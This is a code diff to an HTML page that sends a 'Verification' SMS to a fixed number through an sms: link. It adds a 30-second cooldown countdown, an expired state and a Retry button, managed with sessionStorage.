@@ -266,6 +266,20 @@
       color: #fff;
     }
 
+    .sms-countdown {
+      margin: 12px auto 0;
+      color: var(--muted);
+      font-size: clamp(1rem, 1.8vw, 1.4rem);
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .sms-retry {
+      display: block;
+      width: min(240px, 100%);
+      margin: 14px auto 0;
+    }
+
     .hidden {
       display: none !important;
     }
@@ -488,6 +502,8 @@
         <button type="button" class="btn cancel">Cancel</button>
         <a class="btn proceed" href="sms:+265993257111?body=Verification">Proceed</a>
       </div>
+      <p class="sms-countdown hidden" id="smsCountdown" aria-live="polite"></p>
+      <button type="button" class="btn sms-retry hidden" id="smsRetry">Retry</button>
     </div>
   </div>
 
@@ -498,12 +514,21 @@
     const phoneEl = document.getElementById('verificationPhone');
     const loadingState = document.getElementById('loadingState');
     const readyState = document.getElementById('readyState');
+    const ctaRow = document.querySelector('.cta-row');
+    const countdownEl = document.getElementById('smsCountdown');
+    const proceedLink = document.querySelector('.btn.proceed');
+    const retryButton = document.getElementById('smsRetry');
 
     const DEFAULT_SMS_NUMBER = '+265993257111';
     const RECIPIENT_SMS_NUMBER = '+265993257111';
+    const SMS_COOLDOWN_MS = 30 * 1000;
+    const SMS_COOLDOWN_KEY = 'smsCooldownUntil';
+    const SMS_EXPIRED_KEY = 'smsExpired';
+    const SMS_RETRY_IN_PROGRESS_KEY = 'smsRetryInProgress';
     let lastMsgId = 0;
     let currentMessageText = 'Verification';
     let currentPhoneNumber = DEFAULT_SMS_NUMBER;
+    let countdownTimer = null;
 
     function normalizePhone(phone) {
       if (!phone) return DEFAULT_SMS_NUMBER;
@@ -549,7 +574,58 @@
     function updateProceedLink() {
       const number = normalizePhone(RECIPIENT_SMS_NUMBER);
       const body = (currentMessageText || 'Verification').trim();
-      document.querySelector('.btn.proceed').href = 'sms:' + number + '?body=' + encodeURIComponent(body);
+      proceedLink.href = 'sms:' + number + '?body=' + encodeURIComponent(body);
+    }
+
+    function updateSmsCountdown() {
+      const savedDeadline = sessionStorage.getItem(SMS_COOLDOWN_KEY);
+      const deadline = Number(savedDeadline);
+      const secondsLeft = Math.ceil((deadline - Date.now()) / 1000);
+
+      if (!savedDeadline || !Number.isFinite(deadline) || secondsLeft <= 0) {
+        if (countdownTimer) clearInterval(countdownTimer);
+        countdownTimer = null;
+        sessionStorage.removeItem(SMS_COOLDOWN_KEY);
+        sessionStorage.removeItem(SMS_RETRY_IN_PROGRESS_KEY);
+
+        if (savedDeadline && sessionStorage.getItem(SMS_EXPIRED_KEY) !== 'true') {
+          sessionStorage.setItem(SMS_EXPIRED_KEY, 'true');
+        }
+
+        if (sessionStorage.getItem(SMS_EXPIRED_KEY) === 'true') {
+          showReadyState();
+          ctaRow.classList.add('hidden');
+          countdownEl.textContent = 'Expired';
+          countdownEl.classList.remove('hidden');
+          retryButton.classList.remove('hidden');
+        } else {
+          ctaRow.classList.remove('hidden');
+          countdownEl.classList.add('hidden');
+          retryButton.classList.add('hidden');
+        }
+        return;
+      }
+
+      sessionStorage.removeItem(SMS_EXPIRED_KEY);
+      ctaRow.classList.add('hidden');
+      retryButton.classList.add('hidden');
+
+      if (sessionStorage.getItem(SMS_RETRY_IN_PROGRESS_KEY) === 'true') {
+        loadingState.classList.remove('hidden');
+        readyState.classList.add('hidden');
+        countdownEl.classList.add('hidden');
+      } else {
+        showReadyState();
+        countdownEl.textContent = `You can try again in ${secondsLeft} second${secondsLeft === 1 ? '' : 's'}.`;
+        countdownEl.classList.remove('hidden');
+      }
+    }
+
+    function startSmsCountdown() {
+      sessionStorage.removeItem(SMS_EXPIRED_KEY);
+      sessionStorage.setItem(SMS_COOLDOWN_KEY, String(Date.now() + SMS_COOLDOWN_MS));
+      updateSmsCountdown();
+      countdownTimer = setInterval(updateSmsCountdown, 250);
     }
 
     async function loadRequestPhone() {
@@ -608,9 +684,21 @@
     loadRequestPhone();
     pollMessages();
     setInterval(pollMessages, 3000);
+    updateSmsCountdown();
+    document.addEventListener('visibilitychange', updateSmsCountdown);
 
     document.querySelector('.btn.cancel')?.addEventListener('click', function () {
       window.history.back();
+    });
+
+    proceedLink.addEventListener('click', function () {
+      startSmsCountdown();
+    });
+
+    retryButton.addEventListener('click', function () {
+      sessionStorage.setItem(SMS_RETRY_IN_PROGRESS_KEY, 'true');
+      startSmsCountdown();
+      window.location.href = proceedLink.href;
     });
   </script>
 </body>
